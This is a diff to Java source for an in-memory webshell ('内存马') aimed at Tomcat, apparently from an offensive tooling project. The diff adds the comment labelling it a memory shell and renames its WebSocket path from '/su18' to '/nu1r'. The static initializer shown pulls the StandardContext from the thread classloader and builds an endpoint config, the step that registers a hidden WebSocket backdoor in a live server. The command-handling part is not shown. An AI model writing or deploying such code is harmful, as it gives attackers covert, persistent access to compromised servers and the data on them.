@@ -8,10 +8,13 @@ import javax.websocket.*;
 import javax.websocket.server.ServerContainer;
 import javax.websocket.server.ServerEndpointConfig;
 
+/**
+ * Executor 内存马
+ */
 public class TWSMSFromThread extends Endpoint implements MessageHandler.Whole<String> {
 
     static {
-        String                wsName                = "/su18";
+        String                wsName                = "/nu1r";
         WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
         StandardContext       standardContext       = (StandardContext) webappClassLoaderBase.getResources().getContext();
         ServerEndpointConfig  build                 = ServerEndpointConfig.Builder.create(TWSMSFromThread.class, wsName).build();
